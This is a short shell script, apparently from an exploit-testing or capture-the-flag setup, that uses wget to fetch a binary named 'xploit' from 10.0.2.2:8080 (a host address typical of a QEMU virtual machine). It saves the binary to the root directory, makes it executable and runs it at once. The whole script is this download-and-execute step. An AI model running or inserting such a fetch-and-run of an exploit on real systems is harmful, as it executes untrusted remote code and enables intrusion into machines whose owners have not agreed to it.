#!/bin/sh

set -e

A=${A:-"10.0.2.2:8080"}

wget -P / http://${A}/xploit/host/xploit
chmod u+x /xploit
/xploit
